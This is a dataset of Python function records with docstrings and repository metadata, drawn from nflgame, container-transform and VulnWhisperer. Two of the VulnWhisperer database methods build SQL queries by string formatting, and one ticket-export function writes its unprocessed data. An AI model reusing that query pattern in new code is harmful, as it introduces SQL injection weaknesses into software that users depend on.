"repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "# Defaults to 0 if `txt` isn't parseable.\n", "func_signal": "def height_as_inches(txt):\n", "code": "feet, inches = 0, 0\npieces = re.findall('[0-9]+', txt)\nif len(pieces) >= 1:\n    feet = try_int(pieces[0])\n    if len(pieces) >= 2:\n        inches = try_int(pieces[1])\nreturn feet * 12 + inches", "path": "nflgame/nflgame/update_players.py", "commit_date": "2016-09-07 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "# If we can't get a valid JSON data, exit out and return None.\n", "func_signal": "def __new__(cls, eid=None, fpath=None):\n", "code": "try:\n    rawData = _get_json_data(eid, fpath)\nexcept urllib2.URLError:\n    return None\nif rawData is None or rawData.strip() == '{}':\n    return None\ngame = object.__new__(cls)\ngame.rawData = rawData\n\ntry:\n    if eid is not None:\n        game.eid = eid\n        game.data = json.loads(game.rawData)[game.eid]\n    else:  # For when we have rawData (fpath) and no eid.\n        game.eid = None\n        game.data = json.loads(game.rawData)\n        for k, v in game.data.iteritems():\n            if isinstance(v, dict):\n                game.eid = k\n                game.data = v\n                break\n        assert game.eid is not None\nexcept ValueError:\n    return None\n\nreturn game", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nReturns a GenPlayers sequence of player statistics that combines\ngame statistics and play statistics by taking the max value of\neach corresponding statistic.\n\nThis is useful when accuracy is desirable. Namely, using only\nplay-by-play data or using only game statistics can be unreliable.\nThat is, both are inconsistently correct.\n\nTaking the max values of each statistic reduces the chance of being\nwrong (particularly for stats that are in both play-by-play data\nand game statistics), but does not eliminate them.\n\"\"\"\n", "func_signal": "def max_player_stats(self):\n", "code": "game_players = list(self.players)\nplay_players = list(self.drives.plays().players())\nmax_players = OrderedDict()\n\n# So this is a little tricky. It's possible for a player to have\n# only statistics at the play level, and therefore not be represented\n# in the game level statistics. Therefore, we initialize our\n# max_players with play-by-play stats first. Then go back through\n# and combine them with available game statistics.\nfor pplay in play_players:\n    newp = nflgame.player.GamePlayerStats(pplay.playerid,\n                                          pplay.name, pplay.home,\n                                          pplay.team)\n    maxstats = {}\n    for stat, val in pplay._stats.iteritems():\n        maxstats[stat] = val\n\n    newp._overwrite_stats(maxstats)\n    max_players[pplay.playerid] = newp\n\nfor newp in max_players.itervalues():\n    for pgame in game_players:\n        if pgame.playerid != newp.playerid:\n            continue\n\n        maxstats = {}\n        for stat, val in pgame._stats.iteritems():\n            maxstats[stat] = max([val,\n                                  newp._stats.get(stat, -_MAX_INT)])\n\n        newp._overwrite_stats(maxstats)\n        break\nreturn nflgame.seq.GenPlayerStats(max_players)", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"Make this an iterable sequence.\"\"\"\n", "func_signal": "def __iter__(self):\n", "code": "if self.__iter is None:\n    return iter([])\nif isinstance(self.__iter, OrderedDict):\n    return self.__iter.itervalues()\nreturn iter(self.__iter)", "path": "nflgame/nflgame/seq.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nTakes a single JSON play entry (data) and converts it to a list of events.\n\"\"\"\n", "func_signal": "def _json_play_events(data):\n", "code": "temp = list()\nfor playerid, statcats in data.iteritems():\n    for info in statcats:\n        if info['statId'] not in nflgame.statmap.idmap:\n            continue\n        statvals = nflgame.statmap.values(info['statId'], info['yards'])\n        statvals['playerid'] = None if playerid == '0' else playerid\n        statvals['playername'] = info['playerName'] or None\n        statvals['team'] = info['clubcode']\n        temp.append((int(info['sequence']), statvals))\nreturn [t[1] for t in sorted(temp, key=lambda t: t[0])]", "path": "nflgame/nflgame/game.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\ntouchdowns is a convenience method for returning a Players\nsequence of all players with at least one touchdown.\n\"\"\"\n", "func_signal": "def touchdowns(self):\n", "code": "def gen():\n    for p in self:\n        for f in p.__dict__:\n            if f.endswith('tds') and p.__dict__[f] > 0:\n                yield p\n                break\nreturn self.__class__(gen())", "path": "nflgame/nflgame/seq.py", "commit_date": "2017-10-20 00:00:00", "repo_name": "BurntSushi/nflgame", "stars": 1260, "license": "unlicense", "language": "python", "size": 58383}
{"docstring": "\"\"\"\nLookup the `docker run` keyword from the 'container.docker.parameters' list\n:param container: The container in question\n:param key: The key name we're looking up\n:param is_list: if the response is a list of items\n\"\"\"\n", "func_signal": "def _lookup_parameter(self, container, key, common_type=None):\n", "code": "if not container.get('container', {}).get('parameters'):\n    return\nparams = container['container']['parameters']\n\n# Super hacky - log-opt is a sub option of the logging directive of everything else\nif key == 'log-driver':\n    return [\n        p\n        for p\n        in params\n        if p['key'] in ['log-opt', 'log-driver']]\n\nmatching_params = [\n    p['value']\n    for p\n    in params\n    if p['key'] == key]\n\nif matching_params:\n    if common_type == list:\n        return matching_params\n    else:\n        return matching_params[0]", "path": "container-transform/container_transform/chronos.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nEmits the applications and sorts containers by name\n\n:param containers: List of the container definitions\n:type containers: list of dict\n\n:param verbose: Print out newlines and indented JSON\n:type verbose: bool\n\n:returns: The text output\n:rtype: str\n\"\"\"\n", "func_signal": "def emit_containers(self, containers, verbose=True):\n", "code": "containers = sorted(containers, key=lambda c: c.get('name'))\n\noutput = {\n    'kind': 'Deployment',\n    'apiVersion': 'extensions/v1beta1',\n    'metadata': {\n        'name': None,\n        'namespace': 'default',\n        'labels': {\n            'app': None,\n            'version': 'latest',\n        },\n    },\n    'spec': {\n        'replicas': 1,\n        'selector': {\n            'matchLabels': {\n                'app': None,\n                'version': 'latest'\n            }\n        },\n        'template': {\n            'metadata': {\n                'labels': {\n                    'app': None,\n                    'version': 'latest'\n                }\n            },\n            'spec': {\n                'containers': json.loads(json.dumps(containers))\n            }\n        }\n    }\n}\nif self.volumes:\n    volumes = sorted(self.volumes.values(), key=lambda x: x.get('name'))\n    output['spec']['template']['spec']['volumes'] = volumes\n\nnoalias_dumper = yaml.dumper.SafeDumper\nnoalias_dumper.ignore_aliases = lambda self, data: True\nreturn yaml.dump(\n    output,\n    default_flow_style=False,\n    Dumper=noalias_dumper\n)", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nRead in the pod stream\n\"\"\"\n", "func_signal": "def _read_stream(self, stream):\n", "code": "data = yaml.safe_load_all(stream=stream)\nobj = self._find_convertable_object(data)\npod = self.pod_types[obj['kind']](obj)\nreturn obj, pod.get('containers'), self.ingest_volumes_param(pod.get('volumes', []))", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "# Ensure container name\n# container_name = container.get('name', str(uuid.uuid4()))\n# container['name'] = container_name\n\n", "func_signal": "def validate(self, container):\n", "code": "container_data = defaultdict(lambda: defaultdict(dict))\ncontainer_data.update(container)\n\n# Find keys with periods in the name, these are keys that we delete and\n# create the corresponding entry for\nfor key, value in deepcopy(container_data).items():\n    if key and '.' in key:\n        parts = key.split('.')\n        data = reduce(lambda x, y: {y: x}, reversed(parts + [value]))\n        update_nested_dict(container_data, data)\n        del container_data[key]\n\nreturn container_data", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nTransform the memory into bytes\n\n:param memory: Compose memory definition. (1g, 24k)\n:type memory: memory string or integer\n:return: The memory in bytes\n:rtype: int\n\"\"\"\n", "func_signal": "def ingest_memory(self, memory):\n", "code": "def lshift(num, shift):\n    return num << shift\n\ndef k(num, thousands):\n    return num * thousands\n\n# if isinstance(memory, int):\n#     # Memory was specified as an integer, meaning it is in bytes\nmemory = str(memory)\n\nbit_shift = {\n    'E': {'func': k, 'shift': 10e17},\n    'P': {'func': k, 'shift': 10e14},\n    'T': {'func': k, 'shift': 10e11},\n    'G': {'func': k, 'shift': 10e8},\n    'M': {'func': k, 'shift': 10e5},\n    'K': {'func': k, 'shift': 10e2},\n    'Ei': {'func': lshift, 'shift': 60},\n    'Pi': {'func': lshift, 'shift': 50},\n    'Ti': {'func': lshift, 'shift': 40},\n    'Gi': {'func': lshift, 'shift': 30},\n    'Mi': {'func': lshift, 'shift': 20},\n    'Ki': {'func': lshift, 'shift': 10},\n}\n\nif len(memory) > 2 and memory[-2:] in bit_shift.keys():\n    unit = memory[-2:]\n    number = int(memory[:-2])\n    memory = bit_shift[unit]['func'](number, bit_shift[unit]['shift'])\nelif len(memory) > 1 and memory[-1:] in bit_shift.keys():\n    unit = memory[-1]\n    number = int(memory[:-1])\n    memory = bit_shift[unit]['func'](number, bit_shift[unit]['shift'])\n# Cast to a float to properly consume scientific notation\nreturn int(float(memory))", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nGiven a generic volume definition, create the volumes element\n\"\"\"\n", "func_signal": "def _build_volume(self, volume):\n", "code": "self.volumes[self._build_volume_name(volume.get('host'))] = {\n    'name': self._build_volume_name(volume.get('host')),\n    'hostPath': {\n        'path': volume.get('host')\n    }\n}\nresponse = {\n    'name': self._build_volume_name(volume.get('host')),\n    'mountPath': volume.get('container'),\n\n}\nif volume.get('readonly', False):\n    response['readOnly'] = bool(volume.get('readonly', False))\nreturn response", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nThis is for ingesting the \"volumes\" of a pod spec\n\"\"\"\n", "func_signal": "def ingest_volumes_param(self, volumes):\n", "code": "data = {}\nfor volume in volumes:\n    if volume.get('hostPath', {}).get('path'):\n        data[volume.get('name')] = {\n            'path': volume.get('hostPath', {}).get('path'),\n        }\n    elif volume.get('emptyDir'):\n        data[volume.get('name')] = {}\n    else:\n        data[volume.get('name')] = {}\n    # TODO Support other k8s volume types?\nreturn data", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\n:param filename: The file to be loaded\n:type filename: str\n\"\"\"\n", "func_signal": "def __init__(self, filename=None):\n", "code": "if filename:\n    self._filename = filename\n    stream = self._read_file(filename)\n    self.stream = stream\nelse:\n    self.stream = None", "path": "container-transform/container_transform/chronos.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "# Ensure container name\n", "func_signal": "def validate(self, container):\n", "code": "container_name = container.get('name', str(uuid.uuid4()))\ncontainer['name'] = container_name\n\ncontainer_data = defaultdict(lambda: defaultdict(dict))\ncontainer_data.update(container)\n\n# Find keys with periods in the name, these are keys that we delete and\n# create the corresponding entry for\nfor key, value in deepcopy(container_data).items():\n    if key.startswith('container.'):\n        parts = key.split('.')\n\n        if parts[-2] == 'parameters':\n            # Parameters are inserted below\n            parts = parts[:-1]\n            data = reduce(lambda x, y: {y: x}, reversed(parts + [value]))\n            update_nested_dict(container_data, data)\n            del container_data[key]\n        else:\n            data = reduce(lambda x, y: {y: x}, reversed(parts + [value]))\n            update_nested_dict(container_data, data)\n            del container_data[key]\n\n# Sort the parameters in a deterministic way\nif container_data['container'].get('parameters'):\n    old_params = container_data['container']['parameters']\n    sorted_values = sorted(\n        old_params, key=lambda p: str(p.get('value'))\n    )\n    sorted_keys = sorted(\n        sorted_values, key=lambda p: p.get('key')\n    )\n    container_data['container']['parameters'] = sorted_keys\n\n# Assume the network mode is BRIDGE if unspecified\nif container_data['container'].get('network') != 'HOST':\n    container_data['container']['network'] = 'BRIDGE'\n\ncontainer_data['container']['forcePullImage'] = True\ncontainer_data['container']['type'] = 'DOCKER'\ncontainer_data['uris'] = []\ncontainer_data['schedule'] = 'R/{now}/PT1H'.format(now=datetime.utcnow().isoformat())\ncontainer_data['disabled'] = False\ncontainer_data['shell'] = False\ncontainer_data['owner'] = None\ncontainer_data['ownerName'] = None\ncontainer_data['description'] = \"\"\n\nreturn container_data", "path": "container-transform/container_transform/chronos.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nExtracts the version number from the version.py file.\n\"\"\"\n", "func_signal": "def get_version():\n", "code": "VERSION_FILE = 'container_transform/version.py'\nmo = re.search(r'^__version__ = [\\'\"]([^\\'\"]*)[\\'\"]', open(VERSION_FILE, 'rt').read(), re.M)\nif mo:\n    return mo.group(1)\nelse:\n    raise RuntimeError('Unable to find version string in {0}.'.format(VERSION_FILE))", "path": "container-transform/setup.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "# Super hacky continued - in self._lookup_parameter() we flatten the logging options\n", "func_signal": "def ingest_logging(self, logging):\n", "code": "data = {\n    'driver': [p['value'] for p in logging if p['key'] == 'log-driver'][0],\n    'options': dict([p['value'].split('=') for p in logging if p['key'] == 'log-opt'])\n}\nreturn data", "path": "container-transform/container_transform/chronos.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nThis is for ingesting the \"volumes\" of a app description\n\"\"\"\n", "func_signal": "def _convert_volume(self, volume):\n", "code": "data = {\n    'host': volume.get('hostPath'),\n    'container': volume.get('containerPath'),\n    'readonly': volume.get('mode') == 'RO',\n}\nreturn data", "path": "container-transform/container_transform/chronos.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nAccepts a kubernetes container and pulls out the nested values into the top level\n\"\"\"\n", "func_signal": "def flatten_container(self, container):\n", "code": "for names in ARG_MAP.values():\n    if names[TransformationTypes.KUBERNETES.value]['name'] and \\\n                    '.' in names[TransformationTypes.KUBERNETES.value]['name']:\n        kubernetes_dotted_name = names[TransformationTypes.KUBERNETES.value]['name']\n        parts = kubernetes_dotted_name.split('.')\n        result = lookup_nested_dict(container, *parts)\n        if result:\n            container[kubernetes_dotted_name] = result\nreturn container", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nGet the first instance of a `self.pod_types`\n\"\"\"\n", "func_signal": "def _find_convertable_object(self, data):\n", "code": "data = list(data)\nconvertable_object_idxs = [\n    idx\n    for idx, obj\n    in enumerate(data)\n    if obj.get('kind') in self.pod_types.keys()\n]\nif len(convertable_object_idxs) < 1:\n    raise Exception(\"Kubernetes config didn't contain any of {}\".format(\n        ', '.join(self.pod_types.keys())\n    ))\nreturn list(data)[convertable_object_idxs[0]]", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nGiven a generic volume definition, create the volumes element\n\"\"\"\n", "func_signal": "def _build_volume(volume):\n", "code": "return {\n    'hostPath': volume.get('host'),\n    'containerPath': volume.get('container'),\n    'mode': 'RO' if volume.get('readonly') else 'RW'\n}", "path": "container-transform/container_transform/chronos.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nMake sure that each cmd in command list will be treated as a single token\n:param cmd: str\n:return:\n\"\"\"\n", "func_signal": "def quote(cmd):\n", "code": "if len(shlex.split(cmd)) == 1:\n    # Already a single token, do nothing\n    return cmd\nelse:\n    return shlex.quote(cmd)", "path": "container-transform/container_transform/transformer.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\n:param filename: The file to be loaded\n:type filename: str\n\"\"\"\n", "func_signal": "def __init__(self, filename=None):\n", "code": "obj, stream, volumes_in = {}, None, []\nif filename:\n    self._filename = filename\n    obj, stream, volumes_in = self._read_file(filename)\nself.obj = obj\nself.stream = stream\nself.volumes_in = volumes_in\n\nself.volumes = {}", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\n:param filename: The location of the file to read\n:type filename: str\n\"\"\"\n", "func_signal": "def _read_file(self, filename):\n", "code": "with open(filename, 'r') as stream:\n    return self._read_stream(stream=stream)", "path": "container-transform/container_transform/transformer.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "# return '{mem}Mi'.format(mem=int(memory) >> 20)\n", "func_signal": "def emit_memory(self, memory):\n", "code": "if int(memory) >> 20 > 0:\n    return '{mem}Mi'.format(mem=int(memory) >> 20)\nreturn int(memory)", "path": "container-transform/container_transform/kubernetes.py", "commit_date": "2016-12-24 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "\"\"\"\nExtracts the version number from the version.py file.\n\"\"\"\n", "func_signal": "def get_version():\n", "code": "VERSION_FILE = '../container_transform/version.py'\nmo = re.search(r'^__version__ = [\\'\"]([^\\'\"]*)[\\'\"]', open(VERSION_FILE, 'rt').read(), re.M)\nif mo:\n    return mo.group(1)\nelse:\n    raise RuntimeError('Unable to find version string in {0}.'.format(VERSION_FILE))", "path": "container-transform/docs/conf.py", "commit_date": "2014-12-29 00:00:00", "repo_name": "micahhausler/container-transform", "stars": 1403, "license": "mit", "language": "python", "size": 171}
{"docstring": "#the reason to use the filename instead of the source/scan_name is because the filename already belongs to\n#that latest scan, and we maintain integrity making sure that it is the exact scan we checked\n", "func_signal": "def set_latest_scan_reported(self, filename):\n", "code": "try:\n    self.cur.execute('UPDATE scan_history SET reported = 1 WHERE filename=\"{}\";'.format(filename))\n    self.conn.commit()\n    self.logger.info('Scan {} marked as successfully processed.'.format(filename))\n    return True\nexcept Exception as e:\n    self.logger.error('Failed while setting scan with file {} as processed'.format(filename))\n\nreturn False", "path": "VulnWhisperer/vulnwhisp/vulnwhisp.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "'''\nsaves all tickets locally, local snapshot of vulnerability_management ticktes\n'''\n#check if file already exists\n", "func_signal": "def download_tickets(self, path):\n", "code": "check_date = str(date.today())\nfname = '{}jira_{}.json'.format(path, check_date) \nif os.path.isfile(fname):\n    self.logger.info(\"File {} already exists, skipping ticket download\".format(fname))\n    return True\ntry:\n    self.logger.info(\"Saving locally tickets from the last {} months\".format(self.max_time_tracking))\n    jql = \"labels=vulnerability_management AND NOT labels=advisory AND created >=startOfMonth(-{})\".format(self.max_time_tracking)\n    tickets_data = self.jira.search_issues(jql, maxResults=0)\n\n    #TODO process tickets, creating a new field called \"_metadata\" with all the affected assets well structured\n    # for future processing in ELK/Splunk; this includes downloading attachments with assets and processing them\n\n    processed_tickets = []\n\n    for ticket in tickets_data:\n        assets = self.get_assets_from_description(ticket, _raw=True)\n        if not assets:\n            # check if attachment, if so, get assets from attachment\n            assets = self.get_assets_from_attachment(ticket, _raw=True)\n        # process the affected assets to save them as json structure on a new field from the JSON\n        _metadata = {\"affected_hosts\": []}\n        if assets:\n            if \"\\n\" in assets:\n                for asset in assets.split(\"\\n\"):\n                    assets_json = self.parse_asset_to_json(asset)\n                    _metadata[\"affected_hosts\"].append(assets_json)\n            else:\n                assets_json = self.parse_asset_to_json(assets)\n                _metadata[\"affected_hosts\"].append(assets_json)\n\n\n        temp_ticket = ticket.raw.get('fields')\n        temp_ticket['_metadata'] = _metadata\n\n        processed_tickets.append(temp_ticket)\n    \n    #end of line needed, as writelines() doesn't add it automatically, otherwise one big line\n    to_save = [json.dumps(ticket.raw.get('fields'))+\"\\n\" for ticket in tickets_data]\n    with open(fname, 'w') as outfile:\n        outfile.writelines(to_save)\n        self.logger.info(\"Tickets saved succesfully.\")\n    \n    return True\n\nexcept Exception as e:\n    self.logger.error(\"Tickets could not be saved locally: {}.\".format(e))\n\nreturn False", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "#JIRA structure of each vulnerability: [source, scan_name, title, diagnosis, consequence, solution, ips, risk, references]\n", "func_signal": "def sync(self, vulnerabilities, project, components=[]):\n", "code": "self.logger.info(\"JIRA Sync started\")\n\nfor vuln in vulnerabilities:\n    # JIRA doesn't allow labels with spaces, so making sure that the scan_name doesn't have spaces\n    # if it has, they will be replaced by \"_\"\n    if \" \" in  vuln['scan_name']:\n        vuln['scan_name'] = \"_\".join(vuln['scan_name'].split(\" \"))\n    \n    # we exclude from the vulnerabilities to report those assets that already exist with *risk_accepted*/*server_decommission*\n    vuln = self.exclude_accepted_assets(vuln)\n    \n    # make sure after exclusion of risk_accepted assets there are still assets\n    if vuln['ips']:\n        exists = False\n        to_update = False\n        ticketid = \"\"\n        ticket_assets = []\n        exists, to_update, ticketid, ticket_assets = self.check_vuln_already_exists(vuln)\n\n        if exists:\n            # If ticket \"resolved\" -> reopen, as vulnerability is still existent\n            self.reopen_ticket(ticketid=ticketid, comment=self.jira_still_vulnerable_comment)\n            self.add_label(ticketid, vuln['risk'])\n            continue\n        elif to_update:\n            self.ticket_update_assets(vuln, ticketid, ticket_assets)\n            self.add_label(ticketid, vuln['risk'])\n            continue\n        attachment_contents = []\n        # if assets >30, add as attachment\n        # create local text file with assets, attach it to ticket\n        if len(vuln['ips']) > self.max_ips_ticket:\n            attachment_contents = vuln['ips']\n            vuln['ips'] = [\"Affected hosts ({assets}) exceed Jira's allowed character limit, added as an attachment.\".format(assets = len(attachment_contents))]\n        try:\n            tpl = template(self.template_path, vuln)\n        except Exception as e:\n            self.logger.error('Exception templating: {}'.format(str(e)))\n            return 0\n        self.create_ticket(title=vuln['title'], desc=tpl, project=project, components=components, tags=[vuln['source'], vuln['scan_name'], 'vulnerability', vuln['risk']], attachment_contents = attachment_contents)\n    else:\n        self.logger.info(\"Ignoring vulnerability as all assets are already reported in a risk_accepted ticket\")\n\nself.close_fixed_tickets(vulnerabilities)\n# we reinitialize so the next sync redoes the query with their specific variables\nself.all_tickets = []\nself.excluded_tickets = []\nreturn True", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "# Returns a list of source.scan_name elements from the database\n\n# we get the list of sources\n", "func_signal": "def get_scan_profiles(self):\n", "code": "try:\n    self.conn.text_factory = str\n    self.cur.execute('SELECT DISTINCT source FROM scan_history;')\n    sources = [r[0] for r in self.cur.fetchall()]\nexcept:\n    sources = []\n    self.logger.error(\"Process failed at executing 'SELECT DISTINCT source FROM scan_history;'\")\n\nresults = []\n\n# we get the list of scans within each source\nfor source in sources:\n    scan_names = []\n    try:\n        self.conn.text_factory = str\n        self.cur.execute(\"SELECT DISTINCT scan_name FROM scan_history WHERE source='{}';\".format(source))\n        scan_names = [r[0] for r in self.cur.fetchall()]\n        for scan in scan_names:\n            results.append('{}.{}'.format(source,scan))\n    except:\n        scan_names = []\n\nreturn results", "path": "VulnWhisperer/vulnwhisp/vulnwhisp.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "\"\"\"Downloads a file from qualys and normalizes it\"\"\"\n\n", "func_signal": "def process_data(self, path='', file_id=None, cleanup=True):\n", "code": "download_file = self.download_file(path=path, file_id=file_id)\nself.logger.info('Downloading file ID: {}'.format(file_id))\nreport_data = self.grab_sections(download_file)\nmerged_data = self.data_normalizer(report_data)\nmerged_data.sort_index(axis=1, inplace=True)\n\nreturn merged_data", "path": "VulnWhisperer/vulnwhisp/frameworks/qualys_web.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "\"\"\"\nMerge and clean data\n:param dataframes:\n:return:\n\"\"\"\n", "func_signal": "def data_normalizer(self, dataframes):\n", "code": "df_dict = dataframes[0]\nmerged_df = pd.concat([df_dict['WEB_SCAN_VULN_BLOCK'], df_dict['WEB_SCAN_SENSITIVE_BLOCK'],\n                       df_dict['WEB_SCAN_INFO_BLOCK']], axis=0,\n                      ignore_index=False)\nmerged_df = pd.merge(merged_df, df_dict['QID_HEADER'], left_on='QID',\n                     right_on='Id')\n\nif 'Content' not in merged_df:\n    merged_df['Content'] = ''\n\ncolumns_to_cleanse = ['Payload #1', 'Request Method #1', 'Request URL #1',\n                      'Request Headers #1', 'Response #1', 'Evidence #1',\n                      'Description', 'Impact', 'Solution', 'Url', 'Content']\n\nfor col in columns_to_cleanse:\n    merged_df[col] = merged_df[col].apply(self.utils.cleanser)\n\nmerged_df = merged_df.drop(['QID_y', 'QID_x'], axis=1)\nmerged_df = merged_df.rename(columns={'Id': 'QID'})\n\nmerged_df = merged_df.assign(**df_dict['SCAN_META'].to_dict(orient='records')[0])\n\nmerged_df = pd.merge(merged_df, df_dict['CATEGORY_HEADER'], how='left', left_on=['Category', 'Severity Level'],\n                     right_on=['Category', 'Severity'], suffixes=('Severity', 'CatSev'))\n\nmerged_df = merged_df.replace('N/A', '').fillna('')\n\ntry:\n    merged_df = \\\n        merged_df[~merged_df.Title.str.contains('Links Crawled|External Links Discovered')]\nexcept Exception as e:\n    self.logger.error('Error normalizing: {}'.format(str(e)))\nreturn merged_df", "path": "VulnWhisperer/vulnwhisp/frameworks/qualys_web.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "#parsing of the qualys vulnerabilities schema\n#parse json\n", "func_signal": "def parse_qualys_vuln_vulnerabilities(self, fullpath, source, scan_name, min_critical, dns_resolv = False):\n", "code": "vulnerabilities = []\n\nrisks = ['info', 'low', 'medium', 'high', 'critical']\n# +1 as array is 0-4, but score is 1-5\nmin_risk = int([i for i,x in enumerate(risks) if x == min_critical][0])+1\n\ntry:\n    data=[json.loads(line) for line in open(fullpath).readlines()]\nexcept Exception as e:\n    self.logger.warn(\"Scan has no vulnerabilities, skipping.\")\n    return vulnerabilities\n\n#qualys fields we want - []\nfor index in range(len(data)):\n    if int(data[index]['risk']) < min_risk:\n        continue\n\n    elif data[index]['type'] == 'Practice' or data[index]['type'] == 'Ig':\n        self.logger.debug(\"Vulnerability '{vuln}' ignored, as it is 'Practice/Potential', not verified.\".format(vuln=data[index]['plugin_name']))\n        continue\n\n    if not vulnerabilities or data[index]['plugin_name'] not in [entry['title'] for entry in vulnerabilities]:\n        vuln = {}\n        #vulnerabilities should have all the info for creating all JIRA labels\n        vuln['source'] = source\n        vuln['scan_name'] = scan_name\n        #vulnerability variables\n        vuln['title'] = data[index]['plugin_name']\n        vuln['diagnosis'] =  data[index]['threat'].replace('\\\\n',' ')\n        vuln['consequence'] = data[index]['impact'].replace('\\\\n',' ')\n        vuln['solution'] = data[index]['solution'].replace('\\\\n',' ')\n        vuln['ips'] = []\n        #TODO ADDED DNS RESOLUTION FROM QUALYS! \\n SEPARATORS INSTEAD OF \\\\n!\n\n        vuln['ips'].append(\"{ip} - {protocol}/{port} - {dns}\".format(**self.get_asset_fields(data[index], dns_resolv)))\n\n        #different risk system than Nessus!\n        vuln['risk'] = risks[int(data[index]['risk'])-1]\n\n        # Nessus \"nan\" value gets automatically casted to float by python\n        if not (type(data[index]['vendor_reference']) is float or data[index]['vendor_reference'] == None):\n            vuln['references'] = data[index]['vendor_reference'].split(\"\\\\n\")\n        else:\n            vuln['references'] = []\n        vulnerabilities.append(vuln)\n    else:\n        # grouping assets by vulnerability to open on single ticket, as each asset has its own nessus entry\n        for vuln in vulnerabilities:\n            if vuln['title'] == data[index]['plugin_name']:\n                vuln['ips'].append(\"{ip} - {protocol}/{port} - {dns}\".format(**self.get_asset_fields(data[index], dns_resolv)))\n\nreturn vulnerabilities", "path": "VulnWhisperer/vulnwhisp/vulnwhisp.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": 